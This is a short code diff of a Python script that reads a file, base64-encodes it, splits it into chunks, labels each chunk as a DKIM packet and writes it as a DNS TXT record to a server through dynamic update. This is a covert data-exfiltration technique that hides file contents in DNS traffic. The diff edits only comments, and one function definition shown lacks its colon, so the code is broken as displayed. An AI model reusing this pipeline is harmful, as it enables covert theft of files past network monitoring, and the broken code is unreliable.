@@ -4,8 +4,7 @@ import dns.update
 import dns.query
 import dns.rdatatype
 
-
-#encoding
+#encode data
 def encode_to_base64(file_path):
 	try:
 		with open(file_path, 'rb') as file:
@@ -18,12 +17,12 @@ def encode_to_base64(file_path):
 	except Exception as error:
 		print(f"An error occured: {error}")
 
-#split encoded text
+#split chunks
 def split_string_into_chunks(encoded_string, chunk_size=128)
 	chunks = [encoded_string[i:i + chunk_size] for i in range(0, len(encoded_string), chunk_size)]
 	return chunks
 	
-#marking for DKIM
+#marking DKIM
 def create_dkim_packets(chunks):
 	dkim_packets = []
 	for index, chunk in enumerate(chunks):
@@ -31,6 +30,7 @@ def create_dkim_packets(chunks):
 		dkim_packets.append(dkim_packet)
 	return dkim_packets
 
+#txt records
 def create_txt(dns_server, domain, txt_record):
 	try:
 		update = dns.update.Update(domain)
